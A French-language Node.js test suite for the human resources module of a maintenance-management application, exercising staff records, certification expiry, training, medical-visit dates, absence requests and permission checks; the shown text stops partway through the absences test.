'use strict';
/**
 * Tests du module Ressources humaines : personnel (CRUD, validation, matricule, compte lié, coût horaire),
 * habilitations (échéances, états, documents, matrice), formations (réalisation → renouvellement),
 * visites médicales, absences (demande, validation par le N+1 ou un valideur RH, refus, annulation,
 * chevauchement), « Mon dossier RH », alertes, tableau de bord, calendrier, services, vérification
 * des échéances, droits (403), portée par secteur, multi-site (lecture seule, en-tête X-GMAO-Site),
 * exports CSV, audit et données de démonstration.
 */
const { test, describe, before, after } = require('node:test');
const assert = require('node:assert/strict');
const { demarrer } = require('./helpers');
const { outils } = require('../server/modules/rh');

const pad = (n) => String(n).padStart(2, '0');
const iso = (d) => `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())}`;
const AUJ = iso(new Date());
const dans = (n) => outils.ajouterJours(AUJ, n);
const PNG = 'data:image/png;base64,' + Buffer.from('89504e470d0a1a0a0000000d49484452', 'hex').toString('base64');

describe('Module Ressources humaines', () => {
  let srv, admin, profils, secteurs, site1, prod, maint, log, qual, site2, prod2;
  const evenements = [];

  /** Client qui envoie l'en-tête de site choisi (X-GMAO-Site). */
  function clientSite(site) {
    let cookie = '';
    const call = async (method, url, body) => {
      const headers = { 'x-requested-with': 'GMAO', cookie };
      if (site != null) headers['x-gmao-site'] = String(site);
      if (body !== undefined) headers['content-type'] = 'application/json';
      const r = await fetch(srv.base + url, { method, headers, body: body === undefined ? undefined : JSON.stringify(body) });
      const sc = r.headers.get('set-cookie'); if (sc) cookie = sc.split(';')[0];
      const txt = await r.text(); let data; try { data = JSON.parse(txt); } catch (e) { data = txt; }
      return { status: r.status, body: data, headers: r.headers };
    };
    return {
      get: (u) => call('GET', u), post: (u, b) => call('POST', u, b === undefined ? {} : b), put: (u, b) => call('PUT', u, b), del: (u) => call('DELETE', u),
      async login(l, p) { const r = await call('POST', '/api/auth/login', { login: l, password: p }); if (r.status !== 200) throw new Error(JSON.stringify(r.body)); return r.body; },
      async ok(m, u, b) { const r = await call(m, u, b); if (r.status < 200 || r.status >= 300) throw new Error(`${m} ${u} → ${r.status} ${JSON.stringify(r.body)}`); return r.body; },
    };
  }
  const profil = (nom) => profils.find((p) => p.nom === nom).id;
  /** Crée un compte et retourne { c (client connecté), user }. */
  async function compte(login, nomProfil, secteurIds, extra = {}) {
    const user = await admin.ok('POST', '/api/utilisateurs', Object.assign({ login, nom: extra.nom || login, prenom: extra.prenom || '', profilId: profil(nomProfil), secteurIds, password: 'motdepasse1', doitChangerMdp: false }, extra));
    const c = srv.client();
    await c.login(login, 'motdepasse1');
    return { c, user };
  }
  const personne = (o) => admin.ok('POST', '/api/rh/personnel', Object.assign({ typeContratCode: 'cdi' }, o));
  const notifsDe = (userId) => srv.db.list('notifications', (n) => n.userId === userId);

  before(async () => {
    srv = await demarrer();
    admin = srv.client();
    await admin.login('admin', 'admin');
    profils = await admin.ok('GET', '/api/profils');
    secteurs = await admin.ok('GET', '/api/secteurs');
    site1 = secteurs.find((s) => s.code === 'SITE');
    prod = secteurs.find((s) => s.code === 'PROD');
    maint = secteurs.find((s) => s.code === 'MAINT');
    log = secteurs.find((s) => s.code === 'LOG');
    qual = secteurs.find((s) => s.code === 'QUAL');
    site2 = await admin.ok('POST', '/api/secteurs', { nom: 'Usine de Valréas', code: 'VAL', type: 'site' });
    prod2 = await admin.ok('POST', '/api/secteurs', { nom: 'Production Valréas', code: 'VAL-PROD', type: 'service', parentId: site2.id });
    for (const evt of ['rh:absenceDemandee', 'rh:absenceValidee', 'rh:absenceRefusee', 'rh:absenceAnnulee', 'rh:habilitationExpiree', 'rh:habilitationBientotExpiree', 'rh:formationRealisee']) {
      srv.ctx.on(evt, (d) => evenements.push({ evt, d }));
    }
  });
  after(async () => { await srv.stop(); });

  // ------------------------------------------------------------------------------------------------
  test('personnel : validation stricte des entrées', async () => {
    const cas = [
      [{ secteurId: maint.id }, 'nom obligatoire'],
      [{ nom: 'X' }, 'service obligatoire'],
      [{ nom: 'X', secteurId: 99999 }, 'secteur inexistant'],
      [{ nom: 'X', secteurId: maint.id, typeContratCode: 'cdx' }, 'type de contrat invalide'],
      [{ nom: 'X', secteurId: maint.id, email: 'pas-un-mail' }, 'e-mail invalide'],
      [{ nom: 'X', secteurId: maint.id, dateEntree: '2024-05-10', dateSortie: '2024-01-01' }, 'sortie avant entrée'],
      [{ nom: 'X', secteurId: maint.id, dateEntree: '10/05/2024' }, 'format de date'],
      [{ nom: 'X', secteurId: maint.id, dateEntree: '2024-02-30' }, 'date inexistante'],
      [{ nom: 'X', secteurId: maint.id, competences: [{ libelle: 'Soudure', niveau: 5 }] }, 'niveau hors 1–4'],
      [{ nom: 'X', secteurId: maint.id, competences: [{ libelle: 'Soudure', niveau: 2 }, { libelle: 'soudure', niveau: 3 }] }, 'compétence en double'],
      [{ nom: 'X', secteurId: maint.id, competences: 'Soudure' }, 'compétences : liste attendue'],
      [{ nom: 'X', secteurId: maint.id, userId: 98765 }, 'compte inexistant'],
      [{ nom: 'X', secteurId: maint.id, managerUserId: 98765 }, 'responsable inexistant'],
      [{ nom: 'X', secteurId: maint.id, coutHoraire: -3 }, 'coût négatif'],
      [{ nom: 'X'.repeat(101), secteurId: maint.id }, 'nom trop long'],
      [{ nom: { a: 1 }, secteurId: maint.id }, 'type invalide'],
      [{ nom: 'X', secteurId: maint.id, contactUrgence: 'Maman' }, 'contact d\'urgence : objet attendu'],
    ];
    for (const [body, msg] of cas) {
      const r = await admin.post('/api/rh/personnel', body);
      assert.equal(r.status, 400, `${msg} : ${JSON.stringify(r.body)}`);
      assert.ok(r.body.erreur, 'message d\'erreur en français');
    }
    assert.equal((await admin.post('/api/rh/personnel', [1, 2])).status, 400, 'corps tableau refusé');
  });

  test('personnel : création, matricule automatique et unique, modification, contrat par défaut', async () => {
    const p = await personne({ nom: 'Durand', prenom: 'Paul', secteurId: maint.id, fonction: 'Mécanicien', typeContratCode: undefined, competences: [{ libelle: 'Hydraulique', niveau: 3 }], contactUrgence: { nom: 'Anne Durand', telephone: '0611223344' }, coutHoraire: 35.5 });
    assert.match(p.matricule, /^MAT-\d{4}$/, 'matricule généré selon le gabarit numerotation.mat');
    assert.equal(p.typeContratCode, srv.ctx.liste('typesContrat')[0].code, 'premier type de contrat par défaut');
    assert.equal(p.actif, true);
    assert.equal(p.createdBy, 1);
    assert.equal(p.secteurChemin, `${site1.nom} › Maintenance`);
    assert.equal(p.siteId, site1.id);
    assert.equal(p.coutHoraire, 35.5);
    assert.deepEqual(p.competences, [{ libelle: 'Hydraulique', niveau: 3 }]);
    assert.deepEqual(p.habilitationsResume, { total: 0, valides: 0, bientot: 0, expirees: 0 });
    assert.ok(Array.isArray(p.habilitations) && Array.isArray(p.absences) && Array.isArray(p.visites) && Array.isArray(p.formations), 'dossier complet');
    assert.equal(p.activite.compteLie, false);

    assert.equal((await admin.post('/api/rh/personnel', { nom: 'Doublon', secteurId: maint.id, matricule: p.matricule.toLowerCase() })).status, 400, 'matricule déjà utilisé (insensible à la casse)');
    const libre = await personne({ nom: 'Libre', secteurId: log.id, matricule: 'EXT-001' });
    assert.equal(libre.matricule, 'EXT-001');

    const maj = await admin.ok('PUT', '/api/rh/personnel/' + p.id, { fonction: 'Chef d\'équipe mécanique', typeContratCode: 'cdd', dateEntree: '2024-01-15', dateSortie: dans(200), competences: [{ libelle: 'Hydraulique', niveau: 4 }, { libelle: 'Pneumatique', niveau: 2 }] });
    assert.equal(maj.matricule, p.matricule, 'matricule conservé');
    assert.equal(maj.nom, 'Durand', 'champs non transmis conservés');
    assert.equal(maj.fonction, 'Chef d\'équipe mécanique');
    assert.equal(maj.typeContratCode, 'cdd');
    assert.equal(maj.competences.length, 2);
    assert.equal(maj.coutHoraire, 35.5);

    const liste = await admin.ok('GET', '/api/rh/personnel?recherche=durand');
    assert.equal(liste.length, 1);
    assert.equal((await admin.ok('GET', '/api/rh/personnel?typeContratCode=cdd')).some((x) => x.id === p.id), true);
    assert.equal((await admin.ok('GET', `/api/rh/personnel?secteurId=${log.id}`)).every((x) => x.secteurId === log.id), true);
    assert.equal((await admin.ok('GET', `/api/rh/personnel?siteId=${site2.id}`)).length, 0);
    assert.equal((await admin.get('/api/rh/personnel/99999')).status, 404);
  });

  test('personnel : compte GMAO lié (pré-remplissage, unicité), champs personnalisés', async () => {
    const cfg = srv.db.getConfig();
    cfg.champsPersonnalises.personnel = [{ cle: 'taille_epi', label: 'Taille des EPI', type: 'liste', options: ['S', 'M', 'L', 'XL'], obligatoire: false, ordre: 1 }];
    srv.db.setConfig(cfg);
    const { user } = await compte('alinked', 'Technicien', [maint.id], { nom: 'Lié', prenom: 'Alain', email: 'alain.lie@sicaf.fr', fonction: 'Électromécanicien', matricule: 'RH-0042' });
    const p = await personne({ userId: user.id, secteurId: maint.id, champs: { taille_epi: 'L' } });
    assert.equal(p.nom, 'Lié', 'nom repris du compte');
    assert.equal(p.prenom, 'Alain');
    assert.equal(p.email, 'alain.lie@sicaf.fr');
    assert.equal(p.fonction, 'Électromécanicien');
    assert.equal(p.matricule, 'RH-0042', 'matricule repris du compte');
    assert.equal(p.userLogin, 'alinked');
    assert.equal(p.compte.login, 'alinked');
    assert.deepEqual(p.champs, { taille_epi: 'L' });
    assert.equal((await admin.post('/api/rh/personnel', { nom: 'Autre', userId: user.id, secteurId: maint.id })).status, 400, 'un compte = une seule fiche');
    assert.equal((await admin.post('/api/rh/personnel', { nom: 'Autre', secteurId: maint.id, champs: { taille_epi: 'XXL' } })).status, 400, 'valeur de champ personnalisé invalide');
    assert.equal((await admin.put('/api/rh/personnel/' + p.id, { managerUserId: user.id })).status, 400, 'pas son propre responsable');
    cfg.champsPersonnalises.personnel = [];
    srv.db.setConfig(cfg);
  });

  test('personnel : coût horaire visible et modifiable uniquement avec rh › modifier', async () => {
    const p = await personne({ nom: 'Coût', prenom: 'Caché', secteurId: prod.id, coutHoraire: 41 });
    // Chef de secteur : rh › voir uniquement
    const { c: chef } = await compte('chefcout', 'Chef de secteur', [prod.id]);
    const vu = await chef.ok('GET', '/api/rh/personnel/' + p.id);
    assert.equal('coutHoraire' in vu, false, 'coût horaire masqué');
    assert.equal((await chef.ok('GET', '/api/rh/personnel')).every((x) => !('coutHoraire' in x)), true);
    // Créateur sans droit de modification : le coût transmis est ignoré
    const { c: createur } = await compte('createurrh', 'Chef de secteur', [prod.id], { overrides: { rh: { creer: true } } });
    const cree = await createur.ok('POST', '/api/rh/personnel', { nom: 'Saisie', secteurId: prod.id, coutHoraire: 99 });
    assert.equal('coutHoraire' in cree, false);
    assert.equal(srv.db.get('personnel', cree.id).coutHoraire, null, 'coût non enregistré sans droit de modification');
    assert.equal((await admin.ok('GET', '/api/rh/personnel/' + p.id)).coutHoraire, 41);
  });

  // ------------------------------------------------------------------------------------------------
  test('habilitations : échéance calculée selon la durée du type, états, historique', async () => {
    const p = await personne({ nom: 'Habile', prenom: 'Hélène', secteurId: maint.id });
    const invalides = [
      [{ typeCode: 'sst', dateObtention: '2025-01-10' }, 'personne obligatoire'],
      [{ personnelId: p.id, dateObtention: '2025-01-10' }, 'type obligatoire'],
      [{ personnelId: p.id, typeCode: 'inconnu', dateObtention: '2025-01-10' }, 'type invalide'],
      [{ personnelId: p.id, typeCode: 'sst' }, 'date d\'obtention obligatoire'],
      [{ personnelId: p.id, typeCode: 'sst', dateObtention: dans(30) }, 'obtention future'],
      [{ personnelId: p.id, typeCode: 'sst', dateObtention: '2025-01-10', dateExpiration: '2024-01-01' }, 'expiration avant obtention'],
      [{ personnelId: 99999, typeCode: 'sst', dateObtention: '2025-01-10' }, 'personne inexistante'],
    ];
    for (const [b, msg] of invalides) assert.equal((await admin.post('/api/rh/habilitations', b)).status, 400, msg);

    const caces = await admin.ok('POST', '/api/rh/habilitations', { personnelId: p.id, typeCode: 'caces_r489', dateObtention: '2024-03-31', organisme: 'AFTRAL', numero: 'R489-1' });
    assert.equal(caces.dateExpiration, '2029-03-31', 'CACES R489 : 60 mois');
    assert.equal(caces.intitule, 'CACES R489 (chariots élévateurs)', 'intitulé par défaut = libellé du type');
    assert.equal(caces.secteurId, maint.id, 'secteur copié de la personne');
    assert.equal(caces.etat, 'valide');
    const finFevrier = await admin.ok('POST', '/api/rh/habilitations', { personnelId: p.id, typeCode: 'permis_feu', dateObtention: '2024-02-29' });
    assert.equal(finFevrier.dateExpiration, '2025-02-28', '12 mois depuis un 29 février');
    assert.equal(finFevrier.etat, 'expiree');
    const explicite = await admin.ok('POST', '/api/rh/habilitations', { personnelId: p.id, typeCode: 'atex', dateObtention: '2025-06-01', dateExpiration: dans(400) });
    assert.equal(explicite.dateExpiration, dans(400), 'échéance saisie respectée');
    // État « bientôt » selon config.rh.alerteJoursAvantEcheance (60 j)
    const sst = await admin.ok('POST', '/api/rh/habilitations', { personnelId: p.id, typeCode: 'sst', dateObtention: outils.ajouterMois(dans(20), -24) });
    assert.equal(sst.dateExpiration, dans(20));
    assert.equal(sst.etat, 'bientot');
    assert.equal(sst.joursRestants, 20);
    // Modification de l'obtention : échéance recalculée
    const maj = await admin.ok('PUT', '/api/rh/habilitations/' + caces.id, { dateObtention: '2025-01-15' });
    assert.equal(maj.dateExpiration, '2030-01-15');
    assert.equal((await admin.put('/api/rh/habilitations/' + caces.id, { personnelId: 1234 })).status, 400, 'pas de transfert vers une autre personne');
    // Une habilitation plus récente du même type remplace l'ancienne (historique)
    const nouvelle = await admin.ok('POST', '/api/rh/habilitations', { personnelId: p.id, typeCode: 'permis_feu', dateObtention: dans(-10) });
    assert.equal(nouvelle.etat, 'valide');
    assert.equal((await admin.ok('GET', '/api/rh/habilitations/' + finFevrier.id)).etat, 'remplacee');
    const dossier = await admin.ok('GET', '/api/rh/personnel/' + p.id);
    assert.deepEqual(dossier.habilitationsResume, { total: 4, valides: 3, bientot: 1, expirees: 0 });
    assert.equal(dossier.habilitations.length, 5, 'historique conservé dans le dossier');
    // Filtres de liste
    const liste = await admin.ok('GET', `/api/rh/habilitations?personnelId=${p.id}`);
    assert.equal(liste.length, 4, 'les habilitations remplacées sont exclues par défaut');
    assert.equal((await admin.ok('GET', `/api/rh/habilitations?personnelId=${p.id}&historique=1`)).length, 5);
    assert.deepEqual((await admin.ok('GET', `/api/rh/habilitations?personnelId=${p.id}&etat=bientot`)).map((h) => h.id), [sst.id]);
    // Suppression
    await admin.ok('DELETE', '/api/rh/habilitations/' + explicite.id);
    assert.equal((await admin.get('/api/rh/habilitations/' + explicite.id)).status, 404);
  });

  test('habilitations : pièces justificatives (5 Mo maximum)', async () => {
    const p = await personne({ nom: 'Justif', secteurId: maint.id });
    const h = await admin.ok('POST', '/api/rh/habilitations', { personnelId: p.id, typeCode: 'elec_b1v', dateObtention: '2025-03-01', documents: [{ nom: 'titre.png', type: 'image/png', contenu: PNG }] });
    assert.equal(h.nbDocuments, 1);
    assert.equal(h.documents[0].contenu, undefined, 'contenu non renvoyé dans la fiche');
    const ajout = await admin.ok('POST', `/api/rh/habilitations/${h.id}/documents`, { nom: 'attestation.pdf', type: 'application/pdf', contenu: 'data:application/pdf;base64,' + Buffer.from('%PDF-1.4 test').toString('base64') });
    assert.equal(ajout.documents.length, 2);
    const gros = 'data:application/pdf;base64,' + Buffer.alloc(5 * 1024 * 1024 + 10).toString('base64');
    const r = await admin.post(`/api/rh/habilitations/${h.id}/documents`, { nom: 'trop-gros.pdf', type: 'application/pdf', contenu: gros });
    assert.equal(r.status, 400);
    assert.match(r.body.erreur, /5 Mo/);
    assert.equal((await admin.post(`/api/rh/habilitations/${h.id}/documents`, { nom: 'x.txt', contenu: 'pas du base64' })).status, 400);
    const dl = await admin.get(`/api/rh/habilitations/${h.id}/documents/1`);
    assert.equal(dl.status, 200);
    assert.equal(dl.headers.get('content-type'), 'application/pdf');
    assert.match(String(dl.body), /%PDF-1.4/);
    assert.equal((await admin.get(`/api/rh/habilitations/${h.id}/documents/9`)).status, 404);
    const sup = await admin.ok('DELETE', `/api/rh/habilitations/${h.id}/documents/0`);
    assert.equal(sup.documents.length, 1);
    assert.equal(sup.documents[0].nom, 'attestation.pdf');
  });

  test('matrice personnel × types et alertes (habilitations, visites, fins de contrat)', async () => {
    const p = await personne({ nom: 'Matrice', prenom: 'Max', secteurId: qual.id, typeContratCode: 'cdd', dateEntree: dans(-100), dateSortie: dans(25) });
    const exp = await admin.ok('POST', '/api/rh/habilitations', { personnelId: p.id, typeCode: 'caces_r486', dateObtention: outils.ajouterMois(dans(-5), -60) });
    await admin.ok('POST', '/api/rh/habilitations', { personnelId: p.id, typeCode: 'elec_b0', dateObtention: dans(-30) });
    await admin.ok('POST', '/api/rh/visites', { personnelId: p.id, type: 'periodique', date: dans(-700), aptitude: 'apte', prochaineVisite: dans(10) });
    const m = await admin.ok('GET', `/api/rh/matrice?secteurId=${qual.id}`);
    assert.equal(m.joursAlerte, 60);
    assert.ok(m.types.length >= 10, 'tous les types de la liste typesHabilitation');
    const ligne = m.personnel.find((x) => x.id === p.id);
    assert.equal(ligne.cellules.caces_r486.etat, 'expiree');
    assert.equal(ligne.cellules.caces_r486.id, exp.id);
    assert.equal(ligne.cellules.elec_b0.etat, 'valide');
    assert.equal(ligne.cellules.sst, undefined);
    assert.ok(m.types.find((t) => t.code === 'caces_r486').expirees >= 1);
    const filtre = await admin.ok('GET', `/api/rh/matrice?secteurId=${qual.id}&types=elec_b0,sst`);
    assert.deepEqual(filtre.types.map((t) => t.code), ['elec_b0', 'sst']);
    // Qui peut intervenir : filtre par habilitation valide
    assert.equal((await admin.ok('GET', '/api/rh/personnel?habilitationTypeCode=elec_b0')).some((x) => x.id === p.id), true);
    assert.equal((await admin.ok('GET', '/api/rh/personnel?habilitationTypeCode=caces_r486')).some((x) => x.id === p.id), false, 'habilitation expirée exclue');

    const al = await admin.ok('GET', '/api/rh/alertes');
    const ah = al.habilitations.find((x) => x.id === exp.id);
    assert.equal(ah.etat, 'expiree');
    assert.equal(ah.siteId, site1.id);
    assert.equal(ah.personnelNom, 'Max Matrice');
    assert.ok(al.visites.some((x) => x.personnelId === p.id && x.etat === 'bientot'));
    assert.ok(al.contrats.some((x) => x.personnelId === p.id && x.etat === 'bientot' && x.joursRestants === 25));
    assert.ok(al.parSite.find((s) => s.siteId === site1.id).total >= 3);
    assert.equal(al.total, al.habilitations.length + al.visites.length + al.contrats.length);
    // Une personne inactive ne génère plus d'alerte
    await admin.ok('PUT', '/api/rh/personnel/' + p.id, { actif: false });
    const al2 = await admin.ok('GET', '/api/rh/alertes');
    assert.equal(al2.habilitations.some((x) => x.personnelId === p.id) || al2.contrats.some((x) => x.personnelId === p.id), false);
    assert.equal((await admin.ok('GET', `/api/rh/matrice?secteurId=${qual.id}`)).personnel.some((x) => x.id === p.id), false, 'matrice : actifs par défaut');
    assert.equal((await admin.ok('GET', `/api/rh/matrice?secteurId=${qual.id}&actif=tous`)).personnel.some((x) => x.id === p.id), true);
  });

  // ------------------------------------------------------------------------------------------------
  test('formations : plan, réalisation → création ou renouvellement des habilitations', async () => {
    const a = await personne({ nom: 'Ancien', prenom: 'Ana', secteurId: maint.id });
    const b = await personne({ nom: 'Nouveau', prenom: 'Ben', secteurId: maint.id });
    const c = await personne({ nom: 'Absent', prenom: 'Carl', secteurId: maint.id });
    const ancienne = await admin.ok('POST', '/api/rh/habilitations', { personnelId: a.id, typeCode: 'sst', dateObtention: outils.ajouterMois(dans(30), -24), numero: 'SST-OLD' });
    const invalides = [
      [{ dateDebut: dans(-3) }, 'intitulé obligatoire'],
      [{ intitule: 'X', personnelIds: [a.id] }, 'date de début obligatoire'],
      [{ intitule: 'X', dateDebut: dans(-3), dateFin: dans(-5), personnelIds: [a.id] }, 'fin avant début'],
      [{ intitule: 'X', dateDebut: dans(-3), habilitationTypeCode: 'zzz', personnelIds: [a.id] }, 'habilitation visée invalide'],
      [{ intitule: 'X', dateDebut: dans(-3), personnelIds: [99999] }, 'participant inexistant'],
      [{ intitule: 'X', dateDebut: dans(-3), personnelIds: [a.id], fournisseurId: 99999 }, 'prestataire inexistant'],
      [{ intitule: 'X', dateDebut: dans(-3), personnelIds: [a.id], factureId: 99999 }, 'facture inexistante'],
      [{ intitule: 'X', dateDebut: dans(-3) }, 'ni participant ni service organisateur'],
      [{ intitule: 'X', dateDebut: dans(-3), personnelIds: [a.id], cout: -10 }, 'coût négatif'],
      [{ intitule: 'X', dateDebut: dans(-3), personnelIds: [a.id], statut: 'faite' }, 'statut invalide'],
    ];
    for (const [body, msg] of invalides) assert.equal((await admin.post('/api/rh/formations', body)).status, 400, msg);

    const f = await admin.ok('POST', '/api/rh/formations', { intitule: 'MAC SST', organisme: 'Croix-Rouge', dateDebut: dans(-3), dateFin: dans(-2), dureeHeures: 7, cout: 540, habilitationTypeCode: 'sst', personnelIds: [a.id, b.id, c.id] });
    assert.equal(f.statut, 'planifiee');
    assert.equal(f.secteurId, maint.id, 'service organisateur = celui du premier participant');
    assert.equal(f.nbParticipants, 3);
    assert.equal(f.coutParParticipant, 180);
    assert.equal((await admin.post(`/api/rh/formations/${f.id}/realiser`, { presents: [a.id, 99999] })).status, 400, 'présent non inscrit');
    const r = await admin.ok('POST', `/api/rh/formations/${f.id}/realiser`, { presents: [a.id, b.id] });
    assert.equal(r.statut, 'realisee');
    assert.equal(r.habilitationsGenerees.length, 2);
    const ga = r.habilitationsGenerees.find((g) => g.personnelId === a.id);
    const gb = r.habilitationsGenerees.find((g) => g.personnelId === b.id);
    assert.equal(ga.action, 'renouvelee');
    assert.equal(ga.habilitationId, ancienne.id, 'renouvellement de l\'habilitation existante');
    assert.equal(gb.action, 'creee');
    const renouvelee = srv.db.get('habilitations', ancienne.id);
    assert.equal(renouvelee.dateObtention, dans(-2));
    assert.equal(renouvelee.dateExpiration, outils.ajouterMois(dans(-2), 24));
    assert.equal(renouvelee.historique.length, 1);
    assert.equal(renouvelee.historique[0].numero, 'SST-OLD');
    assert.equal(renouvelee.formationId, f.id);
    assert.equal(srv.db.get('habilitations', gb.habilitationId).typeCode, 'sst');
    assert.equal(srv.db.count('habilitations', (h) => h.personnelId === c.id), 0, 'participant absent : rien');
    assert.ok(evenements.some((e) => e.evt === 'rh:formationRealisee' && e.d.formation.id === f.id));
    assert.equal(r.participants.find((x) => x.id === c.id).present, false);
    // Garde-fous
    assert.equal((await admin.post(`/api/rh/formations/${f.id}/realiser`, {})).status, 400, 'déjà réalisée');
    assert.equal((await admin.put(`/api/rh/formations/${f.id}`, { statut: 'planifiee' })).status, 400, 'pas de retour arrière');
    assert.equal((await admin.del(`/api/rh/formations/${f.id}`)).status, 400, 'conservée pour la traçabilité');
    const future = await admin.ok('POST', '/api/rh/formations', { intitule: 'Recyclage B1V', dateDebut: dans(10), dateFin: dans(11), habilitationTypeCode: 'elec_b1v', personnelIds: [c.id] });
    assert.equal((await admin.post(`/api/rh/formations/${future.id}/realiser`, {})).status, 400, 'pas avant la date de fin');
    assert.equal((await admin.post('/api/rh/formations', { intitule: 'Futur réalisé', dateDebut: dans(5), statut: 'realisee', personnelIds: [c.id] })).status, 400);
    // Création directement « réalisée » (saisie d'historique) et passage à « réalisée » par PUT
    const direct = await admin.ok('POST', '/api/rh/formations', { intitule: 'Travail en hauteur', dateDebut: dans(-40), statut: 'realisee', habilitationTypeCode: 'travail_hauteur', personnelIds: [c.id] });
    assert.equal(direct.statut, 'realisee');
    assert.equal(srv.db.count('habilitations', (h) => h.personnelId === c.id && h.typeCode === 'travail_hauteur'), 1);
    const passee = await admin.ok('POST', '/api/rh/formations', { intitule: 'ATEX', dateDebut: dans(-8), habilitationTypeCode: 'atex', personnelIds: [b.id] });
    const viaPut = await admin.ok('PUT', `/api/rh/formations/${passee.id}`, { statut: 'realisee' });
    assert.equal(viaPut.statut, 'realisee');
    assert.equal(viaPut.habilitationsGenerees.length, 1);
    // Annulation et suppression d'une formation planifiée
    const annulee = await admin.ok('PUT', `/api/rh/formations/${future.id}`, { statut: 'annulee' });
    assert.equal(annulee.statut, 'annulee');
    await admin.ok('DELETE', `/api/rh/formations/${future.id}`);
    // Filtres et dossier
    assert.ok((await admin.ok('GET', `/api/rh/formations?personnelId=${a.id}`)).every((x) => x.personnelIds.includes(a.id)));
    assert.ok((await admin.ok('GET', '/api/rh/formations?statut=realisee')).every((x) => x.statut === 'realisee'));
    const dossierA = await admin.ok('GET', '/api/rh/personnel/' + a.id);
    assert.equal(dossierA.formations[0].present, true);
    assert.equal(dossierA.statistiques.heuresFormation, 7);
  });

  test('visites médicales : uniquement dates et aptitude, validation, échéances', async () => {
    const p = await personne({ nom: 'Visite', secteurId: log.id });
    const invalides = [
      [{ personnelId: p.id, type: 'periodique' }, 'date obligatoire'],
      [{ personnelId: p.id, date: '2025-02-01', aptitude: 'malade' }, 'aptitude invalide'],
      [{ personnelId: p.id, date: '2025-02-01', type: 'hebdo' }, 'type invalide'],
      [{ personnelId: p.id, date: '2025-02-01', prochaineVisite: '2024-01-01' }, 'prochaine visite avant la visite'],
      [{ personnelId: p.id, date: '2025-02-01', restrictions: 'x'.repeat(201) }, 'restrictions : texte court'],
      [{ date: '2025-02-01' }, 'personne obligatoire'],
    ];
    for (const [b, msg] of invalides) assert.equal((await admin.post('/api/rh/visites', b)).status, 400, msg);
    const v1 = await admin.ok('POST', '/api/rh/visites', { personnelId: p.id, type: 'embauche', date: dans(-800), aptitude: 'apte', prochaineVisite: dans(-5) });
    assert.equal(v1.etat, 'expiree');
    assert.equal(v1.secteurId, log.id);
    assert.equal(v1.typeLibelle.length > 0, true);
    const v2 = await admin.ok('POST', '/api/rh/visites', { personnelId: p.id, type: 'periodique', date: dans(-1), aptitude: 'apte_restrictions', restrictions: 'Pas de port de charges > 15 kg', prochaineVisite: dans(700) });
    assert.equal(v2.etat, 'valide');
    assert.equal((await admin.ok('GET', '/api/rh/visites/' + v1.id)).etat, 'remplacee', 'seule la visite la plus récente fait foi');
    const maj = await admin.ok('PUT', '/api/rh/visites/' + v2.id, { aptitude: 'apte' });
    assert.equal(maj.aptitude, 'apte');
    assert.equal(maj.restrictions, 'Pas de port de charges > 15 kg');
    assert.equal((await admin.ok('GET', `/api/rh/visites?personnelId=${p.id}`)).length, 2);
    assert.equal((await admin.ok('GET', `/api/rh/visites?personnelId=${p.id}&aptitude=apte`)).length, 2);
    await admin.ok('DELETE', '/api/rh/visites/' + v1.id);
    assert.equal((await admin.ok('GET', `/api/rh/visites?personnelId=${p.id}`)).length, 1);
    const champs = Object.keys(srv.db.get('visitesMedicales', v2.id));
    for (const interdit of ['diagnostic', 'pathologie', 'traitement', 'commentaireMedical']) assert.equal(champs.includes(interdit), false);
  });

  // ------------------------------------------------------------------------------------------------
  test('absences : demande via « Mon dossier RH », validation par le N+1 sans droit RH, refus, annulation', async () => {
    const { c: chefEquipe, user: chefUser } = await compte('chefequipe', 'Technicien', [maint.id], { nom: 'Équipe', prenom: 'Chef' });
    const { c: emp, user: empUser } = await compte('employe', 'Demandeur', [maint.id], { nom: 'Employé', prenom: 'Eric' });
    const { c: autre } = await compte('autretech', 'Technicien', [maint.id]);
    const p = await personne({ userId: empUser.id, secteurId: maint.id, managerUserId: chefUser.id, coutHoraire: 33, notes: 'Note RH interne' });

    // Validation des demandes
    assert.equal((await emp.post('/api/rh/moi/absences', { dateDebut: dans(30) })).status, 400, 'type obligatoire');
    assert.equal((await emp.post('/api/rh/moi/absences', { typeCode: 'conges', dateDebut: dans(30), dateFin: dans(28) })).status, 400, 'fin avant début');
    assert.equal((await emp.post('/api/rh/moi/absences', { typeCode: 'conges', dateDebut: dans(30), dateFin: dans(31), demiJournee: 'matin' })).status, 400, 'demi-journée sur un seul jour');
    assert.equal((await emp.post('/api/rh/moi/absences', { typeCode: 'vacances', dateDebut: dans(30) })).status, 400, 'type inconnu');
    assert.equal((await emp.post('/api/rh/moi/absences', { typeCode: 'conges', dateDebut: dans(-60) })).status, 400, 'période passée');

    const a = await emp.ok('POST', '/api/rh/moi/absences', { typeCode: 'conges', dateDebut: dans(30), dateFin: dans(34), commentaire: 'Vacances' });
    assert.equal(a.statut, 'demandee');
    assert.equal(a.demandeurUserId, empUser.id);
    assert.equal(a.secteurId, maint.id);
    assert.equal(a.nbJours, outils.joursOuvres(dans(30), dans(34)), 'jours ouvrés (hors week-end et fériés), quelle que soit la date d\'exécution');
    assert.ok(evenements.some((e) => e.evt === 'rh:absenceDemandee' && e.d.absence.id === a.id));
    const nChef = notifsDe(chefUser.id).filter((n) => /Demande d'absence/.test(n.titre));
    assert.equal(nChef.length, 1, 'le N+1 est notifié');
    assert.equal(nChef[0].lien, '', 'pas de lien vers une vue inaccessible');
    assert.match(nChef[0].message, /Mon dossier RH/);
    assert.ok(notifsDe(1).some((n) => /Demande d'absence/.test(n.titre) && n.lien === '#/rh?onglet=absences'), 'les valideurs RH sont notifiés');

    // Chevauchement
    assert.equal((await emp.post('/api/rh/moi/absences', { typeCode: 'rtt', dateDebut: dans(32) })).status, 400, 'chevauchement refusé');
    // Le N+1 voit la demande dans « Mon dossier RH » et peut décider, un tiers non
    const moiChef = await chefEquipe.ok('GET', '/api/rh/moi');
    assert.equal(moiChef.personnel, null, 'le chef n\'a pas de fiche');
    assert.deepEqual(moiChef.aValider.map((x) => x.id), [a.id]);
    assert.equal(moiChef.aValider[0].peutDecider, true);
    assert.equal((await autre.post(`/api/rh/absences/${a.id}/valider`, {})).status, 403, 'un tiers sans droit ne valide pas');
    assert.equal((await emp.post(`/api/rh/absences/${a.id}/valider`, {})).status, 403, 'pas d\'auto-validation');
    const v = await chefEquipe.ok('POST', `/api/rh/absences/${a.id}/valider`, {});
    assert.equal(v.statut, 'validee');
    assert.equal(v.valideurUserId, chefUser.id);
    assert.ok(v.dateValidation);
